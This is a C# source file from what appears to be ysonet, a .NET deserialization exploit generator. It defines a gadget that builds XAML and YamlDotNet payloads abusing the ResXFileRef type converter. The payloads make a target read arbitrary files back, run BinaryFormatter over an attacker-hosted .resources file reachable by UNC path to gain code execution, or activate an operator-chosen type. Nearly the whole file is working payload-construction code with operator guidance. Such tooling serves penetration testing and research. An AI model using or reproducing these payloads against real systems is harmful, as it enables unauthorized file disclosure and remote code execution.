using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Text;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Resources.ResXFileRef carries [TypeConverter(typeof(Converter))], and that
    /// converter is the whole gadget. Converter.ConvertFrom takes ONE string, splits it into
    /// a path, a type name and an optional encoding, and then does all of this in the
    /// DESERIALIZING process (System.Windows.Forms, System.Resources/ResXFileRef.cs):
    ///
    ///   Type.GetType(typeName, throwOnError: true)     an arbitrary type load, loud on failure
    ///   type == typeof(string)                         new StreamReader(path, encoding).ReadToEnd()
    ///                                                  -> the FILE'S TEXT becomes the value
    ///   otherwise                                      new FileStream(path, Open, Read, Read),
    ///                                                  the whole file into a byte[], then
    ///     byte[]                                       the raw bytes
    ///     MemoryStream                                 the stream itself, no activation
    ///     Bitmap + a ".ico" tail                       new Icon(ms).ToBitmap()
    ///     anything else                                Activator.CreateInstance(type, ...,
    ///                                                  new object[] { memoryStream }, null)
    ///
    /// The path is opened by the TARGET, so it may be a UNC path, and the type name decides
    /// what happens to the bytes. Three of those branches are worth a variant:
    ///
    ///   variant 1  System.String              read a file back: the target hands the file's
    ///                                         text over as the deserialized value.
    ///   variant 2  System.Resources.ResourceSet   ResourceSet(Stream) runs a plain
    ///                                         BinaryFormatter over the .resources file, so
    ///                                         this is a second deserializer reading a
    ///                                         document the operator controls.
    ///   variant 3  whatever --type names      the operator picks the type; the requirement
    ///                                         is one public instance constructor taking a
    ///                                         Stream. It is NOT a code-execution variant:
    ///                                         the operator's chosen type decides the effect
    ///                                         and this file cannot know it.
    ///
    /// THE VALUE'S GRAMMAR is ResXFileRef.ToString()'s, and it is repeated in
    /// ComposeConverterValue below so the payload stays in this file. Quote the path when it
    /// contains ';' or '"', then ";" + type name, then ";" + encoding when there is one.
    /// Parsing is the mirror image: a quoted path runs to the LAST '"' and the value resumes
    /// two characters later, an unquoted one ends at the FIRST ';'. Two consequences worth
    /// knowing before reading the escaping below: an assembly qualified type name is fine
    /// (only ';' separates fields, so its commas are safe), and the whole value is Trim()med
    /// before the split, so leading whitespace on an UNQUOTED path is dropped by the target.
    ///
    /// FORMATTERS: Xaml and YamlDotNet, and the list is short for a structural reason, not
    /// for lack of trying. See SupportedFormatters().
    ///
    /// NOT REACHED BY THE RESTRICTIVE XAML READER. XamlReader.Load(reader, true) - the
    /// CVE-2020-0605/0606 mitigation the WPF clipboard and XPS sinks use - keeps only
    /// System.Windows[.*] DependencyObjects, primitives and registry-allowed types, so it
    /// skips this element's whole subtree and returns null with no exception. That is a
    /// documented limitation of the Xaml branch, asserted in the tests rather than argued.
    ///
    /// Related but different: the Resx PLUGIN's indirect_resx_file mode reaches the same
    /// converter through a RESX document read by ResXResourceReader. This gadget needs no
    /// resource file anywhere - the converter is selected by the serializer itself.
    /// </summary>
    public class ResXFileRefGenerator : GenericGenerator
    {
        // The target type, spelled out in the two places the wire needs it: a XAML xmlns
        // takes a namespace plus an assembly NAME, a YAML tag takes the full display name.
        public const string TargetNamespace = "System.Resources";
        public const string TargetTypeName = "System.Resources.ResXFileRef";
        public const string TargetAssemblySimpleName = "System.Windows.Forms";

        // The two type names this gadget fixes for the operator. Variant 3 uses --type
        // instead. "System.String" needs no assembly: Type.GetType finds an mscorlib type
        // from its bare name, and it is what a reader recognises at a glance.
        public const string StringTypeName = "System.String";
        public const string ResourceSetTypeName =
            "System.Resources.ResourceSet, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        public const int VariantReadFileText = 1;
        public const int VariantLoadDotResources = 2;
        public const int VariantActivateNamedType = 3;

        // Canonical long option names, so the generator, its help, the editor and the tests
        // cannot drift apart.
        public const string VariantOptionName = "variant";
        public const string TypeOptionName = "type";
        public const string EncodingOptionName = "enc";

        private int variantNumber = VariantLoadDotResources;
        private string typeNameOption = "";
        private string encodingOption = "";
        private bool rawInput;

        // ---- Metadata ----------------------------------------------------------

        public override GadgetFacetSet Facets()
        {
            // This set describes the DEFAULT variant (2, load a .resources file), because
            // that is the ONLY variant that inherits it - variants 1 and 3 declare their own
            // FacetOverride. So it must NOT claim information disclosure, which is variant 1's
            // effect alone: opening a file and running a BinaryFormatter over it discloses
            // nothing to the operator. The category search still finds this gadget under
            // information-disclosure through variant 1's override (GadgetFacetReader expands
            // per variant). Same shape as WbemClassObjectUnmarshal, whose gadget set is its
            // default variant's and whose other variant overrides.
            return new GadgetFacetSet()
                // Variant 2 opens the path (file-system, and a UNC path makes it network),
                // then ResourceSet(Stream) runs a BinaryFormatter over it (nested
                // deserialization, and through it code execution).
                .WithKinds(PayloadKind.FileSystem, PayloadKind.NestedDeserialization,
                    PayloadKind.CodeExecution, PayloadKind.Network)
                // Declared rather than derived: -c is a path on the TARGET, and a UNC path is
                // an equally normal value an operator searches for. local-file is deliberately
                // NOT declared - ysonet never opens the path while building.
                .WithInputs(PayloadInput.TargetPath, PayloadInput.UncPath)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // System.Windows.Forms 4.0.0.0 chain; fired on 4.8.1 by the rows in
                // PayloadsFireIntoTestSinks.
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // The RESX/ResXFileRef research this project already credits for the Resx plugin
        // (NCC Group, 2018: "ASP.NET resource files (.RESX) and deserialisation issues").
        // Contributors() is deliberately omitted: it would name the same person, and the
        // base class already drops a duplicate. That the Xaml and YamlDotNet carriers are
        // measured here for the first time is said in AdditionalInfo() and the docs instead.
        public override string Finders()
        {
            return "Soroush Dalili";
        }

        // Two short sentences. This is the FIRST block of the interactive info panel, and a
        // long one pushes the formatter, command-input and category lines off the screen.
        public override string AdditionalInfo()
        {
            return "Runs the ResXFileRef type converter on the target, which opens the -c path "
                + "(a UNC path works) and builds the type named in the payload. The type name "
                + "decides the effect, so pick the variant that matches what you want.";
        }

        public override List<string> Labels()
        {
            // Independent: it serializes a framework type of its own and consumes no other
            // gadget. It is still usable as a Xaml PRODUCER through WorkflowDesigner
            // (-g WorkflowDesigner -bgc ResXFileRef), which needs no declaration here.
            return new List<string> { GadgetTags.Independent };
        }

        /// <summary>
        /// Xaml and YamlDotNet, and only those two. The reason is structural and it decides
        /// the whole list in one step: this gadget needs a serializer that runs a TYPE
        /// CONVERTER over a scalar it has already decided is a ResXFileRef. Two do:
        ///
        ///   Xaml - an object element's initialization text is handed to the type's
        ///     TypeConverter, so the whole payload is one element with the value as its text.
        ///   YamlDotNet - a tagged ROOT scalar resolves the type from the tag, and
        ///     ScalarNodeDeserializer then falls back to
        ///     TypeDescriptor.GetConverter(expectedType).ConvertFrom.
        ///
        /// Everything else fails, and the reasons split into three groups:
        ///
        ///   NO PARAMETERLESS CONSTRUCTOR AND NO WRITABLE MEMBER. ResXFileRef has two
        ///     constructors, both taking arguments, and its three properties (FileName,
        ///     TypeName, TextFileEncoding) are all read-only. JavaScriptSerializer says
        ///     "No parameterless constructor defined for this object", and both
        ///     SharpSerializer modes say the same - SharpSerializer converts a simple value
        ///     with Convert.ChangeType, never through TypeDescriptor. XmlSerializer,
        ///     DataContractSerializer, DataContractJsonSerializer and MessagePack Typeless
        ///     all build their contract from read-write members, so they have nothing to
        ///     write and nothing to convert.
        ///   THE CONVERTER IS NEVER CONSULTED. BinaryFormatter, SoapFormatter, LosFormatter,
        ///     NetDataContractSerializer and FsPickler rebuild the object from its FIELDS
        ///     (fileName / typeName / textFileEncoding), which produces a real, inert
        ///     ResXFileRef and reads no file at all. The type IS [Serializable], so this
        ///     cell looks like it works and quietly does nothing.
        ///   NOWHERE TO DECLARE IT. Json.NET does build a string contract for the type, but
        ///     a JSON string literal at an object root carries no $type and the
        ///     {"$type":..,"$value":..} form is refused with the same message; with a
        ///     DECLARED ResXFileRef target it throws InvalidCastException, because
        ///     ConvertFrom returns the CONVERTED object and not a ResXFileRef. A typed
        ///     member would fix that, and there is none: the whole .NET 4 framework exposes
        ///     no settable member of this type (ResXDataNode.FileRef is getter-only), so
        ///     Json.NET, FastJson and YamlDotNet-by-member have nothing to name. YamlDotNet
        ///     is in this list only because it tags the ROOT scalar directly.
        ///
        /// The "(3)" suffix is a display-only annotation meaning "this formatter carries 3
        /// variants". The variants differ only in the type name inside one string, so both
        /// formatters carry all three and neither narrows the list.
        /// </summary>
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.Xaml + " (3)",
                // The version note is the catalogue's convention for this formatter: the
                // bundled YamlDotNet 4.3.2 resolves a "!<!AssemblyQualifiedName>" tag to a
                // real type, and 5.0.0 removed that. Everything downstream splits on the
                // first space, so the whole suffix is display-only.
                "YamlDotNet < 5.0.0 (3)",
            };
        }

        // -c is a path on the TARGET. ysonet never opens it while building the payload.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.TargetPath;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(VariantReadFileText,
                        "Read the file back: the target returns the file's text as the value")
                    // No second stage and no activation, so this variant claims neither
                    // nested deserialization nor code execution. Repeating the inputs,
                    // requirements and versions is required: an override replaces the WHOLE
                    // facet set.
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.FileSystem, PayloadKind.InformationDisclosure,
                            PayloadKind.Network)
                        .WithInputs(PayloadInput.TargetPath, PayloadInput.UncPath)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481)))
                    .WithoutOptions(TypeOptionName),

                // The default, and NOT the first one listed - which is why it says so with
                // AsDefault(): the interactive editor would otherwise pre-select variant 1
                // and ship a different payload than the same command line builds. It
                // inherits the gadget's facet set (a null override), which is exactly this
                // variant's capability.
                new GadgetVariant(VariantLoadDotResources,
                        "Load a .resources file: the target's ResourceSet reads it with BinaryFormatter (default)")
                    .AsDefault()
                    .WithoutOptions(TypeOptionName, EncodingOptionName),

                new GadgetVariant(VariantActivateNamedType,
                        "Activate a type you name, with the file's bytes as its Stream argument - NOT necessarily code execution")
                    // A bring-your-own variant inherits NOTHING from the proven one: the
                    // operator's type decides the result and this gadget cannot know it. Only
                    // the file open is certain.
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.FileSystem, PayloadKind.Other)
                        .WithInputs(PayloadInput.TargetPath, PayloadInput.UncPath)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481)))
                    .WithoutOptions(EncodingOptionName),
            };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet
            {
                {
                    "var|" + VariantOptionName + "=",
                    "Which of the converter's branches the payload asks for. All three open -c "
                        + "on the target and differ only in the TYPE NAME the payload carries, "
                        + "which is what the converter does with the bytes. Choices:\r\n"
                        + "1 - read the file back. The type name is System.String, so the target "
                        + "runs StreamReader(path, encoding).ReadToEnd() and the file's TEXT "
                        + "becomes the deserialized value. Use --" + EncodingOptionName + " to "
                        + "pick the encoding. -t reads the file on THIS machine.\r\n"
                        + "2 (default) - load a .resources file. The type name is "
                        + "System.Resources.ResourceSet, whose Stream constructor runs a plain "
                        + "BinaryFormatter over the file, so -c should point at a .resources "
                        + "document you host (build one with -p Resx -m CompiledDotResources). "
                        + "-t deserializes the payload HERE, which runs that BinaryFormatter "
                        + "over -c on THIS machine (a self-exploit) - only -t a .resources file "
                        + "you trust.\r\n"
                        + "3 (research) - activate a type you name with --" + TypeOptionName
                        + ". The target reads the whole file into a MemoryStream and calls "
                        + "Activator.CreateInstance(yourType, ..., new object[]{ stream }), so "
                        + "the type needs one public instance constructor taking a Stream. This "
                        + "is an escape hatch, NOT a stronger version of variant 2: what happens "
                        + "is decided by the type you chose and ysonet cannot know it. -t "
                        + "activates that type on THIS machine, so only -t a type and file you "
                        + "trust.",
                    v => int.TryParse(v, out variantNumber)
                },
                {
                    TypeOptionName + "=",
                    "Variant 3 only: the type the TARGET resolves with Type.GetType and then "
                        + "activates with the file's bytes. Give an assembly qualified name "
                        + "(\"Some.Namespace.SomeType, SomeAssembly\") unless it is an mscorlib "
                        + "type, which resolves from its bare name. It must have a public "
                        + "instance constructor taking one System.IO.Stream; a name that does "
                        + "not resolve makes the target throw, loudly, before anything is read.",
                    v => typeNameOption = v
                },
                {
                    EncodingOptionName + "=",
                    "Variant 1 only: the encoding name the target passes to "
                        + "Encoding.GetEncoding for the text read, for example utf-8 or "
                        + "windows-1252. Leave it out and the target uses Encoding.Default.",
                    v => encodingOption = v
                },
            };

            // The shared --rawinput switch, appended rather than re-declared, so its help
            // text stays in one place (GenericGenerator.HandWritten.cs).
            foreach (Option sharedOption in RawInputOption(v => rawInput = v))
                options.Add(sharedOption);

            return options;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            GuardVariantFormatter(variantNumber, formatter);
            RequireCommandInput(inputArgs);

            string path = inputArgs.Cmd;
            string typeName = TypeNameForVariant();
            string encodingName = EncodingForVariant();
            string converterValue = ComposeConverterValue(path, typeName, encodingName);
            NoteIfTheTargetWillTrimThePath(inputArgs, path);

            // Build and shrink FIRST with the self-test off, so a value --minify rewrote is
            // refused before -t makes THIS machine open the wrong file. Everything below can
            // then assume the emitted document still carries what the operator typed.
            InputArgs probeArgs = inputArgs.DeepCopy();
            probeArgs.Test = false;
            object probe = FinishHandWrittenPayload(
                BuildPayload(formatter, converterValue), formatter, probeArgs);
            RefuseIfTheValueDidNotSurvive(probe, formatter, path, typeName, encodingName, inputArgs);

            if (!inputArgs.Test)
                return probe;

            // The operator asked for a self-test, so hand the same document to the shared
            // path again and let it deserialize HERE. -t in ysonet is a self-exploit: the
            // payload's effect fires in this process, on this machine. For every variant
            // that means the ResXFileRef converter runs on -c right here - variant 1 reads
            // the file back, variant 2 runs a BinaryFormatter over the .resources you named,
            // variant 3 activates the type you named with the file's bytes. Point -t only at
            // a file and a type you trust, because you are running them on yourself.
            return FinishHandWrittenPayload(
                BuildPayload(formatter, converterValue), formatter, inputArgs);
        }

        // ---- The two documents -------------------------------------------------

        private string BuildPayload(string formatter, string converterValue)
        {
            if (IsFormatter(formatter, Formatters.Xaml))
            {
                // One element, and its initialization TEXT is what the XAML object writer
                // hands to the type converter. The xmlns form takes a CLR namespace and an
                // assembly NAME, never a display name with a version and a public key token.
                return @"<ResXFileRef xmlns=""clr-namespace:" + TargetNamespace + ";assembly="
                    + TargetAssemblySimpleName + @""">"
                    + EscapeForXmlAttribute(converterValue, rawInput)
                    + @"</ResXFileRef>";
            }

            if (IsFormatter(formatter, Formatters.YamlDotNet))
            {
                // A tagged root SCALAR. The tag names the type, so YamlDotNet resolves it and
                // then converts the scalar with the type's own TypeConverter. The tag carries
                // no spaces after its commas, because the YAML minifier would remove them.
                // The scalar is DOUBLE quoted, so the value is escaped for a double quoted
                // literal - never with the single-quote escaper, which writes an illegal \'.
                return @"
!<!" + TargetTypeName + "," + TargetAssemblySimpleName
                    + @",Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> """
                    + EscapeForJsonDoubleQuoted(converterValue, rawInput) + @"""";
            }

            throw UnsupportedFormatter(formatter);
        }

        // ---- The converter value -----------------------------------------------

        /// <summary>
        /// The one string the converter parses, composed exactly the way
        /// ResXFileRef.ToString() composes it, so anything the framework itself can write is
        /// expressible here and nothing else is invented:
        ///
        ///   path;typeName                 when the path holds neither ';' nor '"'
        ///   "path";typeName               otherwise - the parser reads to the LAST quote,
        ///                                 so a path containing a quote round-trips too
        ///   ...;encodingName              appended only when an encoding was asked for
        /// </summary>
        private string ComposeConverterValue(string path, string typeName, string encodingName)
        {
            string value = PathNeedsQuoting(path) ? "\"" + path + "\";" : path + ";";
            value += typeName;
            if (!string.IsNullOrEmpty(encodingName))
                value += ";" + encodingName;
            return value;
        }

        // ResXFileRef.ToString()'s rule, and the parser's mirror image of it.
        private static bool PathNeedsQuoting(string path)
        {
            return path.IndexOf(';') >= 0 || path.IndexOf('"') >= 0;
        }

        private string TypeNameForVariant()
        {
            if (variantNumber == VariantReadFileText)
                return StringTypeName;
            if (variantNumber == VariantLoadDotResources)
                return ResourceSetTypeName;
            if (variantNumber == VariantActivateNamedType)
            {
                if (string.IsNullOrEmpty(typeNameOption) || typeNameOption.Trim().Length == 0)
                    throw new ArgumentException(Name() + " variant " + VariantActivateNamedType
                        + " needs --" + TypeOptionName + " \"<type the target activates>\", "
                        + "the name it resolves with Type.GetType. Variants "
                        + VariantReadFileText + " and " + VariantLoadDotResources
                        + " carry a fixed type name instead.");
                return typeNameOption;
            }

            throw new ArgumentException(Name() + " has no variant " + variantNumber + ". Use --"
                + VariantOptionName + " " + VariantReadFileText + " (read the file back), --"
                + VariantOptionName + " " + VariantLoadDotResources + " (load a .resources "
                + "file) or --" + VariantOptionName + " " + VariantActivateNamedType
                + " (activate the type named by --" + TypeOptionName + ").");
        }

        // The third field exists only for the text read: the other two branches never reach
        // Encoding.GetEncoding. The CLI still parses --enc there and simply ignores it, which
        // is what GadgetVariant.WithoutOptions declares to the interactive editor.
        private string EncodingForVariant()
        {
            if (variantNumber != VariantReadFileText)
                return "";
            return string.IsNullOrEmpty(encodingOption) ? "" : encodingOption.Trim();
        }

        // The target Trim()s the whole value before it splits it, so leading whitespace on an
        // UNQUOTED path is dropped there - nothing this gadget emits can prevent that, and it
        // is the operator's path to choose. A note, never a refusal: debug mode, stderr, so a
        // tool embedding ysonet still captures pure payload output.
        private void NoteIfTheTargetWillTrimThePath(InputArgs inputArgs, string path)
        {
            if (PathNeedsQuoting(path) || path.Length == 0 || !char.IsWhiteSpace(path[0]))
                return;

            Debugging.ShowNote(inputArgs, Name() + ": the target trims the converter value "
                + "before it splits it, so the leading whitespace in \"" + path + "\" will be "
                + "lost. A path containing ';' or '\"' is quoted and keeps it.");
        }

        // ---- Value fidelity ----------------------------------------------------

        /// <summary>
        /// The composed value is operator DATA the target opens, and --minify is not text
        /// preserving on either branch: XmlMinifier trims text nodes and collapses "a; b" and
        /// the space after a comma, YamlMinifier collapses runs of whitespace and the space
        /// after a comma. That is deliberate - it is what shrinks an embedded document - so
        /// verify the emitted payload and refuse, rather than changing the minifier or
        /// guessing which characters are at risk.
        ///
        /// The two halves of the value are judged differently, and the split matters:
        ///
        ///   the PATH is positional data the target hands to a file API, so it must survive
        ///     EXACTLY;
        ///   the TYPE NAME and the ENCODING NAME are identifier grammars. Both minifiers
        ///     deliberately turn "mscorlib, Version=4.0.0.0" into the comma-packed spelling,
        ///     and Type.GetType and Encoding.GetEncoding parse either one, so those are
        ///     compared without whitespace. Comparing them exactly would refuse every
        ///     minified payload the gadget can build.
        ///
        /// Skipped under --rawinput, where the operator has taken the escaping decision
        /// themselves and the document is not guaranteed to parse.
        /// </summary>
        private void RefuseIfTheValueDidNotSurvive(object payload, string formatter, string path,
            string typeName, string encodingName, InputArgs inputArgs)
        {
            if (rawInput)
                return;

            string delivered = DeliveredValue(payload, formatter);
            if (delivered == null)
                return;

            bool minified = inputArgs != null && inputArgs.Minify;
            string expectedPath = IsFormatter(formatter, Formatters.Xaml)
                ? path
                // The YAML scalar is quoted, so the document holds the ESCAPED rendering.
                : EscapeForJsonDoubleQuoted(path, false);

            if (delivered.IndexOf(expectedPath, StringComparison.Ordinal) < 0)
                throw new ArgumentException(Name() + " cannot deliver this path with " + formatter
                    + (minified ? " and --minify" : "") + ": the payload no longer carries \""
                    + path + "\" exactly, so the target would open a different file."
                    + (minified
                        ? " Drop --minify, or use a path with no repeated spaces, no \"; \" and no \", \" sequence."
                        : " Use a path with no carriage return and no leading or trailing whitespace."));

            string lostIdentifier = FirstMissingIdentifier(delivered, typeName, encodingName);
            if (lostIdentifier == null)
                return;

            throw new ArgumentException(Name() + " cannot deliver \"" + lostIdentifier + "\" with "
                + formatter + (minified ? " and --minify" : "")
                + ": the payload no longer carries it, so the target would resolve something "
                + "else or fail to resolve anything." + (minified ? " Drop --minify." : ""));
        }

        // The type and encoding names, compared without whitespace (see the note above).
        private static string FirstMissingIdentifier(string delivered, string typeName,
            string encodingName)
        {
            string packed = StripWhitespace(delivered);
            if (packed.IndexOf(StripWhitespace(typeName), StringComparison.Ordinal) < 0)
                return typeName;
            if (!string.IsNullOrEmpty(encodingName)
                && packed.IndexOf(StripWhitespace(encodingName), StringComparison.Ordinal) < 0)
                return encodingName;
            return null;
        }

        // What the target will really read: for XAML the DECODED text nodes (so an escaped
        // '&' is compared as the operator typed it, and the xmlns attribute cannot be
        // mistaken for the value), for YAML the document itself, which is one scalar.
        private static string DeliveredValue(object payload, string formatter)
        {
            if (IsFormatter(formatter, Formatters.Xaml))
            {
                string xml = MinifiedTextGuard.AsXmlText(payload);
                if (xml == null)
                    return null;
                return string.Join("\n", MinifiedTextGuard.XmlTextValues(xml, false).ToArray());
            }
            return payload as string;
        }

        private static string StripWhitespace(string value)
        {
            var sb = new StringBuilder(value.Length);
            foreach (char c in value)
                if (!char.IsWhiteSpace(c))
                    sb.Append(c);
            return sb.ToString();
        }

    }
}
